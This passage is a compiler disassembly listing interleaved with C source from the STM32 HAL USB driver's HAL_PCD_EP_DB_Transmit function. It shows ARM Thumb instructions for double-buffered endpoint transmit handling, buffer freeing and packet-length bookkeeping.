 800307c:	f000 82fa 	beq.w	8003674 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003080:	68fb      	ldr	r3, [r7, #12]
 8003082:	681b      	ldr	r3, [r3, #0]
 8003084:	461a      	mov	r2, r3
 8003086:	68bb      	ldr	r3, [r7, #8]
 8003088:	781b      	ldrb	r3, [r3, #0]
 800308a:	009b      	lsls	r3, r3, #2
 800308c:	4413      	add	r3, r2
 800308e:	881b      	ldrh	r3, [r3, #0]
 8003090:	b29b      	uxth	r3, r3
 8003092:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003096:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800309a:	82fb      	strh	r3, [r7, #22]
 800309c:	68fb      	ldr	r3, [r7, #12]
 800309e:	681b      	ldr	r3, [r3, #0]
 80030a0:	461a      	mov	r2, r3
 80030a2:	68bb      	ldr	r3, [r7, #8]
 80030a4:	781b      	ldrb	r3, [r3, #0]
 80030a6:	009b      	lsls	r3, r3, #2
 80030a8:	441a      	add	r2, r3
 80030aa:	8afb      	ldrh	r3, [r7, #22]
 80030ac:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80030b0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80030b4:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80030b8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80030bc:	b29b      	uxth	r3, r3
 80030be:	8013      	strh	r3, [r2, #0]
 80030c0:	e2d8      	b.n	8003674 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 80030c2:	88fb      	ldrh	r3, [r7, #6]
 80030c4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80030c8:	2b00      	cmp	r3, #0
 80030ca:	d021      	beq.n	8003110 <HAL_PCD_EP_DB_Transmit+0x22e>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80030cc:	68fb      	ldr	r3, [r7, #12]
 80030ce:	681b      	ldr	r3, [r3, #0]
 80030d0:	461a      	mov	r2, r3
 80030d2:	68bb      	ldr	r3, [r7, #8]
 80030d4:	781b      	ldrb	r3, [r3, #0]
 80030d6:	009b      	lsls	r3, r3, #2
 80030d8:	4413      	add	r3, r2
 80030da:	881b      	ldrh	r3, [r3, #0]
 80030dc:	b29b      	uxth	r3, r3
 80030de:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80030e2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80030e6:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80030ea:	68fb      	ldr	r3, [r7, #12]
 80030ec:	681b      	ldr	r3, [r3, #0]
 80030ee:	461a      	mov	r2, r3
 80030f0:	68bb      	ldr	r3, [r7, #8]
 80030f2:	781b      	ldrb	r3, [r3, #0]
 80030f4:	009b      	lsls	r3, r3, #2
 80030f6:	441a      	add	r2, r3
 80030f8:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80030fc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003100:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003104:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003108:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800310c:	b29b      	uxth	r3, r3
 800310e:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 8003110:	68bb      	ldr	r3, [r7, #8]
 8003112:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8003116:	2b01      	cmp	r3, #1
 8003118:	f040 82ac 	bne.w	8003674 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 800311c:	68bb      	ldr	r3, [r7, #8]
 800311e:	695a      	ldr	r2, [r3, #20]
 8003120:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003124:	441a      	add	r2, r3
 8003126:	68bb      	ldr	r3, [r7, #8]
 8003128:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 800312a:	68bb      	ldr	r3, [r7, #8]
 800312c:	69da      	ldr	r2, [r3, #28]
 800312e:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003132:	441a      	add	r2, r3
 8003134:	68bb      	ldr	r3, [r7, #8]
 8003136:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 8003138:	68bb      	ldr	r3, [r7, #8]
 800313a:	6a1a      	ldr	r2, [r3, #32]
 800313c:	68bb      	ldr	r3, [r7, #8]
 800313e:	691b      	ldr	r3, [r3, #16]
 8003140:	429a      	cmp	r2, r3
 8003142:	d30b      	bcc.n	800315c <HAL_PCD_EP_DB_Transmit+0x27a>
        {
          len = ep->maxpacket;
 8003144:	68bb      	ldr	r3, [r7, #8]
 8003146:	691b      	ldr	r3, [r3, #16]
 8003148:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 800314c:	68bb      	ldr	r3, [r7, #8]
 800314e:	6a1a      	ldr	r2, [r3, #32]
 8003150:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003154:	1ad2      	subs	r2, r2, r3
 8003156:	68bb      	ldr	r3, [r7, #8]
 8003158:	621a      	str	r2, [r3, #32]
 800315a:	e017      	b.n	800318c <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else if (ep->xfer_len_db == 0U)
 800315c:	68bb      	ldr	r3, [r7, #8]
 800315e:	6a1b      	ldr	r3, [r3, #32]
 8003160:	2b00      	cmp	r3, #0
 8003162:	d108      	bne.n	8003176 <HAL_PCD_EP_DB_Transmit+0x294>
        {
          len = TxPctSize;
 8003164:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003168:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 800316c:	68bb      	ldr	r3, [r7, #8]
 800316e:	2200      	movs	r2, #0
 8003170:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003174:	e00a      	b.n	800318c <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else
        {
          ep->xfer_fill_db = 0U;
 8003176:	68bb      	ldr	r3, [r7, #8]
 8003178:	2200      	movs	r2, #0
 800317a:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
          len = ep->xfer_len_db;
 800317e:	68bb      	ldr	r3, [r7, #8]
 8003180:	6a1b      	ldr	r3, [r3, #32]
 8003182:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 8003186:	68bb      	ldr	r3, [r7, #8]
 8003188:	2200      	movs	r2, #0
 800318a:	621a      	str	r2, [r3, #32]
        }

        /* Write remaining Data to Buffer */
        /* Set the Double buffer counter for pma buffer1 */
        PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 800318c:	68bb      	ldr	r3, [r7, #8]
 800318e:	785b      	ldrb	r3, [r3, #1]
 8003190:	2b00      	cmp	r3, #0
 8003192:	d165      	bne.n	8003260 <HAL_PCD_EP_DB_Transmit+0x37e>
 8003194:	68fb      	ldr	r3, [r7, #12]
 8003196:	681b      	ldr	r3, [r3, #0]
 8003198:	63fb      	str	r3, [r7, #60]	; 0x3c
 800319a:	68fb      	ldr	r3, [r7, #12]
 800319c:	681b      	ldr	r3, [r3, #0]
 800319e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80031a2:	b29b      	uxth	r3, r3
 80031a4:	461a      	mov	r2, r3
 80031a6:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80031a8:	4413      	add	r3, r2
 80031aa:	63fb      	str	r3, [r7, #60]	; 0x3c
 80031ac:	68bb      	ldr	r3, [r7, #8]
 80031ae:	781b      	ldrb	r3, [r3, #0]
 80031b0:	00da      	lsls	r2, r3, #3
 80031b2:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80031b4:	4413      	add	r3, r2
 80031b6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80031ba:	63bb      	str	r3, [r7, #56]	; 0x38
 80031bc:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031be:	881b      	ldrh	r3, [r3, #0]
 80031c0:	b29b      	uxth	r3, r3
 80031c2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80031c6:	b29a      	uxth	r2, r3
 80031c8:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031ca:	801a      	strh	r2, [r3, #0]
 80031cc:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031d0:	2b3e      	cmp	r3, #62	; 0x3e
 80031d2:	d91d      	bls.n	8003210 <HAL_PCD_EP_DB_Transmit+0x32e>
 80031d4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031d8:	095b      	lsrs	r3, r3, #5
 80031da:	64bb      	str	r3, [r7, #72]	; 0x48
 80031dc:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031e0:	f003 031f 	and.w	r3, r3, #31
 80031e4:	2b00      	cmp	r3, #0
 80031e6:	d102      	bne.n	80031ee <HAL_PCD_EP_DB_Transmit+0x30c>
 80031e8:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80031ea:	3b01      	subs	r3, #1
 80031ec:	64bb      	str	r3, [r7, #72]	; 0x48
 80031ee:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031f0:	881b      	ldrh	r3, [r3, #0]
 80031f2:	b29a      	uxth	r2, r3
 80031f4:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80031f6:	b29b      	uxth	r3, r3
 80031f8:	029b      	lsls	r3, r3, #10
 80031fa:	b29b      	uxth	r3, r3
 80031fc:	4313      	orrs	r3, r2
 80031fe:	b29b      	uxth	r3, r3
 8003200:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003204:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003208:	b29a      	uxth	r2, r3
 800320a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800320c:	801a      	strh	r2, [r3, #0]
 800320e:	e044      	b.n	800329a <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003210:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003214:	2b00      	cmp	r3, #0
 8003216:	d10a      	bne.n	800322e <HAL_PCD_EP_DB_Transmit+0x34c>
 8003218:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800321a:	881b      	ldrh	r3, [r3, #0]
 800321c:	b29b      	uxth	r3, r3
 800321e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003222:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003226:	b29a      	uxth	r2, r3
 8003228:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800322a:	801a      	strh	r2, [r3, #0]
 800322c:	e035      	b.n	800329a <HAL_PCD_EP_DB_Transmit+0x3b8>
 800322e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003232:	085b      	lsrs	r3, r3, #1
 8003234:	64bb      	str	r3, [r7, #72]	; 0x48
 8003236:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800323a:	f003 0301 	and.w	r3, r3, #1
 800323e:	2b00      	cmp	r3, #0
 8003240:	d002      	beq.n	8003248 <HAL_PCD_EP_DB_Transmit+0x366>
 8003242:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003244:	3301      	adds	r3, #1
 8003246:	64bb      	str	r3, [r7, #72]	; 0x48
 8003248:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800324a:	881b      	ldrh	r3, [r3, #0]
 800324c:	b29a      	uxth	r2, r3
 800324e:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003250:	b29b      	uxth	r3, r3
 8003252:	029b      	lsls	r3, r3, #10
 8003254:	b29b      	uxth	r3, r3
 8003256:	4313      	orrs	r3, r2
 8003258:	b29a      	uxth	r2, r3
 800325a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800325c:	801a      	strh	r2, [r3, #0]
 800325e:	e01c      	b.n	800329a <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003260:	68bb      	ldr	r3, [r7, #8]
 8003262:	785b      	ldrb	r3, [r3, #1]
 8003264:	2b01      	cmp	r3, #1
 8003266:	d118      	bne.n	800329a <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003268:	68fb      	ldr	r3, [r7, #12]
 800326a:	681b      	ldr	r3, [r3, #0]
 800326c:	647b      	str	r3, [r7, #68]	; 0x44
 800326e:	68fb      	ldr	r3, [r7, #12]
 8003270:	681b      	ldr	r3, [r3, #0]
 8003272:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003276:	b29b      	uxth	r3, r3
 8003278:	461a      	mov	r2, r3
 800327a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800327c:	4413      	add	r3, r2
 800327e:	647b      	str	r3, [r7, #68]	; 0x44
 8003280:	68bb      	ldr	r3, [r7, #8]
 8003282:	781b      	ldrb	r3, [r3, #0]
 8003284:	00da      	lsls	r2, r3, #3
 8003286:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8003288:	4413      	add	r3, r2
 800328a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800328e:	643b      	str	r3, [r7, #64]	; 0x40
 8003290:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003294:	b29a      	uxth	r2, r3
 8003296:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8003298:	801a      	strh	r2, [r3, #0]

        /* Copy user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr0, (uint16_t)len);
 800329a:	68fb      	ldr	r3, [r7, #12]
 800329c:	6818      	ldr	r0, [r3, #0]
 800329e:	68bb      	ldr	r3, [r7, #8]
 80032a0:	6959      	ldr	r1, [r3, #20]
 80032a2:	68bb      	ldr	r3, [r7, #8]
 80032a4:	891a      	ldrh	r2, [r3, #8]
 80032a6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80032aa:	b29b      	uxth	r3, r3
 80032ac:	f005 f8c9 	bl	8008442 <USB_WritePMA>
 80032b0:	e1e0      	b.n	8003674 <HAL_PCD_EP_DB_Transmit+0x792>
    }
  }
  else /* Data Buffer1 ACK received */
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 80032b2:	68fb      	ldr	r3, [r7, #12]
 80032b4:	681b      	ldr	r3, [r3, #0]
 80032b6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80032ba:	b29b      	uxth	r3, r3
 80032bc:	461a      	mov	r2, r3
 80032be:	68bb      	ldr	r3, [r7, #8]
 80032c0:	781b      	ldrb	r3, [r3, #0]
 80032c2:	00db      	lsls	r3, r3, #3
 80032c4:	4413      	add	r3, r2
 80032c6:	68fa      	ldr	r2, [r7, #12]
 80032c8:	6812      	ldr	r2, [r2, #0]
 80032ca:	4413      	add	r3, r2
 80032cc:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80032d0:	881b      	ldrh	r3, [r3, #0]
 80032d2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80032d6:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len >= TxPctSize)
 80032da:	68bb      	ldr	r3, [r7, #8]
 80032dc:	699a      	ldr	r2, [r3, #24]
 80032de:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80032e2:	429a      	cmp	r2, r3
 80032e4:	d307      	bcc.n	80032f6 <HAL_PCD_EP_DB_Transmit+0x414>
    {
      ep->xfer_len -= TxPctSize;
 80032e6:	68bb      	ldr	r3, [r7, #8]
 80032e8:	699a      	ldr	r2, [r3, #24]
 80032ea:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80032ee:	1ad2      	subs	r2, r2, r3
 80032f0:	68bb      	ldr	r3, [r7, #8]
 80032f2:	619a      	str	r2, [r3, #24]
 80032f4:	e002      	b.n	80032fc <HAL_PCD_EP_DB_Transmit+0x41a>
    }
    else
    {
      ep->xfer_len = 0U;
 80032f6:	68bb      	ldr	r3, [r7, #8]
 80032f8:	2200      	movs	r2, #0
 80032fa:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 80032fc:	68bb      	ldr	r3, [r7, #8]
 80032fe:	699b      	ldr	r3, [r3, #24]
 8003300:	2b00      	cmp	r3, #0
 8003302:	f040 80c0 	bne.w	8003486 <HAL_PCD_EP_DB_Transmit+0x5a4>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003306:	68bb      	ldr	r3, [r7, #8]
 8003308:	785b      	ldrb	r3, [r3, #1]
 800330a:	2b00      	cmp	r3, #0
 800330c:	d126      	bne.n	800335c <HAL_PCD_EP_DB_Transmit+0x47a>
 800330e:	68fb      	ldr	r3, [r7, #12]
 8003310:	681b      	ldr	r3, [r3, #0]
 8003312:	67fb      	str	r3, [r7, #124]	; 0x7c
 8003314:	68fb      	ldr	r3, [r7, #12]
 8003316:	681b      	ldr	r3, [r3, #0]
 8003318:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800331c:	b29b      	uxth	r3, r3
 800331e:	461a      	mov	r2, r3
 8003320:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8003322:	4413      	add	r3, r2
 8003324:	67fb      	str	r3, [r7, #124]	; 0x7c
 8003326:	68bb      	ldr	r3, [r7, #8]
 8003328:	781b      	ldrb	r3, [r3, #0]
 800332a:	00da      	lsls	r2, r3, #3
 800332c:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 800332e:	4413      	add	r3, r2
 8003330:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003334:	67bb      	str	r3, [r7, #120]	; 0x78
 8003336:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003338:	881b      	ldrh	r3, [r3, #0]
 800333a:	b29b      	uxth	r3, r3
 800333c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003340:	b29a      	uxth	r2, r3
 8003342:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003344:	801a      	strh	r2, [r3, #0]
 8003346:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003348:	881b      	ldrh	r3, [r3, #0]
 800334a:	b29b      	uxth	r3, r3
 800334c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003350:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003354:	b29a      	uxth	r2, r3
 8003356:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003358:	801a      	strh	r2, [r3, #0]
 800335a:	e01a      	b.n	8003392 <HAL_PCD_EP_DB_Transmit+0x4b0>
 800335c:	68bb      	ldr	r3, [r7, #8]
 800335e:	785b      	ldrb	r3, [r3, #1]
 8003360:	2b01      	cmp	r3, #1
 8003362:	d116      	bne.n	8003392 <HAL_PCD_EP_DB_Transmit+0x4b0>
 8003364:	68fb      	ldr	r3, [r7, #12]
 8003366:	681b      	ldr	r3, [r3, #0]
 8003368:	667b      	str	r3, [r7, #100]	; 0x64
 800336a:	68fb      	ldr	r3, [r7, #12]
 800336c:	681b      	ldr	r3, [r3, #0]
 800336e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003372:	b29b      	uxth	r3, r3
 8003374:	461a      	mov	r2, r3
 8003376:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8003378:	4413      	add	r3, r2
 800337a:	667b      	str	r3, [r7, #100]	; 0x64
 800337c:	68bb      	ldr	r3, [r7, #8]
 800337e:	781b      	ldrb	r3, [r3, #0]
 8003380:	00da      	lsls	r2, r3, #3
 8003382:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8003384:	4413      	add	r3, r2
 8003386:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800338a:	663b      	str	r3, [r7, #96]	; 0x60
 800338c:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 800338e:	2200      	movs	r2, #0
 8003390:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003392:	68fb      	ldr	r3, [r7, #12]
 8003394:	681b      	ldr	r3, [r3, #0]
 8003396:	677b      	str	r3, [r7, #116]	; 0x74
 8003398:	68bb      	ldr	r3, [r7, #8]
 800339a:	785b      	ldrb	r3, [r3, #1]
 800339c:	2b00      	cmp	r3, #0
 800339e:	d12b      	bne.n	80033f8 <HAL_PCD_EP_DB_Transmit+0x516>
 80033a0:	68fb      	ldr	r3, [r7, #12]
 80033a2:	681b      	ldr	r3, [r3, #0]
 80033a4:	66fb      	str	r3, [r7, #108]	; 0x6c
 80033a6:	68fb      	ldr	r3, [r7, #12]
 80033a8:	681b      	ldr	r3, [r3, #0]
 80033aa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80033ae:	b29b      	uxth	r3, r3
 80033b0:	461a      	mov	r2, r3
 80033b2:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 80033b4:	4413      	add	r3, r2
 80033b6:	66fb      	str	r3, [r7, #108]	; 0x6c
 80033b8:	68bb      	ldr	r3, [r7, #8]
 80033ba:	781b      	ldrb	r3, [r3, #0]
 80033bc:	00da      	lsls	r2, r3, #3
 80033be:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 80033c0:	4413      	add	r3, r2
 80033c2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80033c6:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 80033ca:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033ce:	881b      	ldrh	r3, [r3, #0]
 80033d0:	b29b      	uxth	r3, r3
 80033d2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80033d6:	b29a      	uxth	r2, r3
 80033d8:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033dc:	801a      	strh	r2, [r3, #0]
 80033de:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033e2:	881b      	ldrh	r3, [r3, #0]
 80033e4:	b29b      	uxth	r3, r3
 80033e6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80033ea:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80033ee:	b29a      	uxth	r2, r3
 80033f0:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033f4:	801a      	strh	r2, [r3, #0]
 80033f6:	e017      	b.n	8003428 <HAL_PCD_EP_DB_Transmit+0x546>
 80033f8:	68bb      	ldr	r3, [r7, #8]
 80033fa:	785b      	ldrb	r3, [r3, #1]
 80033fc:	2b01      	cmp	r3, #1
 80033fe:	d113      	bne.n	8003428 <HAL_PCD_EP_DB_Transmit+0x546>
 8003400:	68fb      	ldr	r3, [r7, #12]
 8003402:	681b      	ldr	r3, [r3, #0]
 8003404:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003408:	b29b      	uxth	r3, r3
 800340a:	461a      	mov	r2, r3
 800340c:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 800340e:	4413      	add	r3, r2
 8003410:	677b      	str	r3, [r7, #116]	; 0x74
 8003412:	68bb      	ldr	r3, [r7, #8]
 8003414:	781b      	ldrb	r3, [r3, #0]
 8003416:	00da      	lsls	r2, r3, #3
 8003418:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 800341a:	4413      	add	r3, r2
 800341c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003420:	673b      	str	r3, [r7, #112]	; 0x70
 8003422:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 8003424:	2200      	movs	r2, #0
 8003426:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8003428:	68bb      	ldr	r3, [r7, #8]
 800342a:	781b      	ldrb	r3, [r3, #0]
 800342c:	4619      	mov	r1, r3
 800342e:	68f8      	ldr	r0, [r7, #12]
 8003430:	f009 fa69 	bl	800c906 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 8003434:	88fb      	ldrh	r3, [r7, #6]
 8003436:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800343a:	2b00      	cmp	r3, #0
 800343c:	f040 811a 	bne.w	8003674 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003440:	68fb      	ldr	r3, [r7, #12]
 8003442:	681b      	ldr	r3, [r3, #0]
 8003444:	461a      	mov	r2, r3
 8003446:	68bb      	ldr	r3, [r7, #8]
 8003448:	781b      	ldrb	r3, [r3, #0]
 800344a:	009b      	lsls	r3, r3, #2
 800344c:	4413      	add	r3, r2
 800344e:	881b      	ldrh	r3, [r3, #0]
 8003450:	b29b      	uxth	r3, r3
 8003452:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003456:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800345a:	f8a7 3088 	strh.w	r3, [r7, #136]	; 0x88
 800345e:	68fb      	ldr	r3, [r7, #12]
 8003460:	681b      	ldr	r3, [r3, #0]
 8003462:	461a      	mov	r2, r3
 8003464:	68bb      	ldr	r3, [r7, #8]
 8003466:	781b      	ldrb	r3, [r3, #0]
 8003468:	009b      	lsls	r3, r3, #2
 800346a:	441a      	add	r2, r3
 800346c:	f8b7 3088 	ldrh.w	r3, [r7, #136]	; 0x88
 8003470:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003474:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003478:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800347c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003480:	b29b      	uxth	r3, r3
 8003482:	8013      	strh	r3, [r2, #0]
 8003484:	e0f6      	b.n	8003674 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 8003486:	88fb      	ldrh	r3, [r7, #6]
 8003488:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800348c:	2b00      	cmp	r3, #0
 800348e:	d121      	bne.n	80034d4 <HAL_PCD_EP_DB_Transmit+0x5f2>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003490:	68fb      	ldr	r3, [r7, #12]
 8003492:	681b      	ldr	r3, [r3, #0]
 8003494:	461a      	mov	r2, r3
 8003496:	68bb      	ldr	r3, [r7, #8]
 8003498:	781b      	ldrb	r3, [r3, #0]
 800349a:	009b      	lsls	r3, r3, #2
 800349c:	4413      	add	r3, r2
 800349e:	881b      	ldrh	r3, [r3, #0]
 80034a0:	b29b      	uxth	r3, r3
 80034a2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80034a6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80034aa:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 80034ae:	68fb      	ldr	r3, [r7, #12]
 80034b0:	681b      	ldr	r3, [r3, #0]
 80034b2:	461a      	mov	r2, r3
 80034b4:	68bb      	ldr	r3, [r7, #8]
 80034b6:	781b      	ldrb	r3, [r3, #0]
 80034b8:	009b      	lsls	r3, r3, #2
 80034ba:	441a      	add	r2, r3
 80034bc:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80034c0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80034c4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80034c8:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80034cc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80034d0:	b29b      	uxth	r3, r3
 80034d2:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 80034d4:	68bb      	ldr	r3, [r7, #8]
 80034d6:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80034da:	2b01      	cmp	r3, #1
 80034dc:	f040 80ca 	bne.w	8003674 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 80034e0:	68bb      	ldr	r3, [r7, #8]
 80034e2:	695a      	ldr	r2, [r3, #20]
 80034e4:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80034e8:	441a      	add	r2, r3
 80034ea:	68bb      	ldr	r3, [r7, #8]
 80034ec:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 80034ee:	68bb      	ldr	r3, [r7, #8]
 80034f0:	69da      	ldr	r2, [r3, #28]
 80034f2:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80034f6:	441a      	add	r2, r3
 80034f8:	68bb      	ldr	r3, [r7, #8]
 80034fa:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
